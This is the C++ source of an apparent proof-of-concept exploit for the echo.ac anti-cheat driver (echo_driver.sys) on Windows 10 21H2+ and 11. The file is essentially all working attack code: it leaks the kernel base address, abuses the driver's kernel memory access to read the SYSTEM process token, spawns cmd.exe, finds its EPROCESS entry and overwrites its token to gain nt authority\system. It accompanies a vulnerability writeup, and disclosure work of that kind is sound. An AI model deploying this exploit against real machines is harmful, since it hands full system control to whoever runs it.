/*
 * I strongly recommend also reading the writeup for more info on the background of this company and exploit.
 * https://github.com/kite03/echoac-poc/blob/main/Writeup.md
 */

#include "DriverInterface.h"

#pragma comment(lib, "ntdll.lib")

int main() {
    SetConsoleTitle("echo.ac PoC");
    std::cout << "[?] echo_driver.sys Privilege Escalation PoC demonstration." << std::endl;
    DriverInterface Driver; // Instantiate our driver
    HANDLE processHandle = Driver.get_handle_for_pid(GetCurrentProcessId()); // Fetch a HANDLE for our own program.

    NTSTATUS status; // Status variable
    PRTL_PROCESS_MODULES ModuleInfo; // Store modules
    uintptr_t ntoskrnlBaseAddress = NULL;   // Kernel base address

    // Leak ntoskrnl base address using NtQuerySystemInformation
    ModuleInfo = (PRTL_PROCESS_MODULES) VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!ModuleInfo) {
        printf("[!] Error allocating module memory! Error Code: %lu", GetLastError());
        Driver.Shutdown();
        return -1;
    }

    if (!NT_SUCCESS(status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) 11, ModuleInfo, 1024 * 1024,
                                                      NULL))) // 11 = SystemModuleInformation
    {
        printf("\n[!] Error: Unable to query module list (%#x)\n", status);

        VirtualFree(ModuleInfo, 0, MEM_RELEASE);
        Driver.Shutdown();
        return -1;
    }

    // Iterate through module list till we find the Kernel base address.
    for (int i = 0; i < ModuleInfo->NumberOfModules; i++) {
        if (!strcmp((const char *) ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName,
                    "ntoskrnl.exe")) {
            ntoskrnlBaseAddress = (uintptr_t) ModuleInfo->Modules[i].ImageBase;
            break;
        }
    }

    VirtualFree(ModuleInfo, 0, MEM_RELEASE);

    std::cout << "[>] ntoskrnl.exe base address: " << std::hex << ntoskrnlBaseAddress << std::dec << std::endl;

    uintptr_t TokenOffset = 0x04B8; // Windows 10 21H2+ and Windows 11 only
    uintptr_t PIDOffset = 0x0440; // Windows 10 21H2+ and Windows 11 only
    uintptr_t ActiveProcessLinksOffset = 0x0448; // Windows 10 21H2+ and Windows 11 only

    // Fetch Kernel EPROCESS/KPROCESS
    // Get NTOS module address
    HMODULE ntos = LoadLibrary("ntoskrnl.exe");
    // Get function address
    auto PsInitialSystemProcessOffsetAddr = (uint64_t) GetProcAddress(ntos, "PsInitialSystemProcess");
    // Get offset
    auto offset = PsInitialSystemProcessOffsetAddr - (uint64_t) ntos;
    // Rebase to get Kernel address
    auto realPsInitialSystemProcessAddr = offset + ntoskrnlBaseAddress;
    // Read the EPROCESS pointer to get real address
    uint64_t PsInitialSystemProcessEPROCESS;
    Driver.read_memory_raw(
            (void *) realPsInitialSystemProcessAddr,
            &PsInitialSystemProcessEPROCESS,
            sizeof(PsInitialSystemProcessEPROCESS),
            processHandle
    );

    std::cout << "[>] PsInitialSystemProcess EPROCESS Address: " << std::hex << PsInitialSystemProcessEPROCESS
              << std::dec << std::endl;

    // Get the PID of the System
    DWORD systemPID;
    Driver.read_memory_raw(
            (void *) (PsInitialSystemProcessEPROCESS + PIDOffset),
            &systemPID,
            sizeof(systemPID),
            processHandle
    );

    // This is always 4.
    std::cout << "[>] System PID: " << systemPID << std::endl;

    // Steal the System process token address.
    uint64_t SystemToken;
    Driver.read_memory_raw(
            (void *) (PsInitialSystemProcessEPROCESS + TokenOffset),
            &SystemToken,
            sizeof(SystemToken),
            processHandle
    );
    std::cout << "[>] System Token: " << std::hex << SystemToken << std::dec << std::endl;

    // Spawn a new shell and fetch its PID. We will elevate this shell to nt authority\system.
    std::cout << "[-] Spawning a new shell that will be elevated to nt authority\\system!" << std::endl;
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi;
    CreateProcess(
            R"(C:\Windows\system32\cmd.exe)",
            nullptr,
            nullptr,
            nullptr,
            TRUE,
            CREATE_NEW_CONSOLE,
            nullptr,
            "C:\\Windows",
            &si,
            &pi
    );

    // Save the PID for later.
    DWORD OurShellPID = pi.dwProcessId;

    // Initiate our variables.
    LIST_ENTRY activeProcessLinkList;
    uint64_t NextProcessEPROCESSBlock = PsInitialSystemProcessEPROCESS;
    Driver.read_memory_raw(
            (void *) (PsInitialSystemProcessEPROCESS + ActiveProcessLinksOffset),
            &activeProcessLinkList,
            sizeof(activeProcessLinkList),
            processHandle
    );
    // You can fetch every single process' EPROCESS block from this original Kernel list, we iterate through it till we find our shell's PID.
    while (true) {
        DWORD processPID = 0;
        NextProcessEPROCESSBlock = (uint64_t) activeProcessLinkList.Flink - ActiveProcessLinksOffset;
        // Fetch PID and compare it
        Driver.read_memory_raw(
                (void *) (NextProcessEPROCESSBlock + PIDOffset),
                &processPID,
                (processPID),
                processHandle
        );
        if (processPID == OurShellPID) {
            std::cout << "[>] Found our shell's EPROCESS address: " << std::hex << NextProcessEPROCESSBlock << std::dec
                      << std::endl;
            uint64_t OurShellsToken;
            Driver.read_memory_raw(
                    (void *) (NextProcessEPROCESSBlock + TokenOffset),
                    &OurShellsToken,
                    sizeof(OurShellsToken),
                    processHandle
            );
            std::cout << "[>] Found our shell's current Process Token: " << std::hex << OurShellsToken << std::dec
                      << std::endl;
            // Overwrite our shell's Process Token with the System's Process Token, to give us our newfound powers.
            Driver.read_memory_raw(
                    (void *) &SystemToken,
                    (void *) (NextProcessEPROCESSBlock + TokenOffset),
                    sizeof(SystemToken),
                    processHandle
            );
            break;
        }
        // Fetch next EPROCESS block, in case we didn't find it.
        Driver.read_memory_raw(
                (void *) (NextProcessEPROCESSBlock + ActiveProcessLinksOffset),
                &activeProcessLinkList,
                sizeof(activeProcessLinkList),
                processHandle
        );
    }

    std::cout << "[$] The newly opened shell should now be running as nt authority\\system!" << std::endl;

    // Close the handles.
    FreeLibrary(ntos);
    Driver.Shutdown();

    return 0;
}
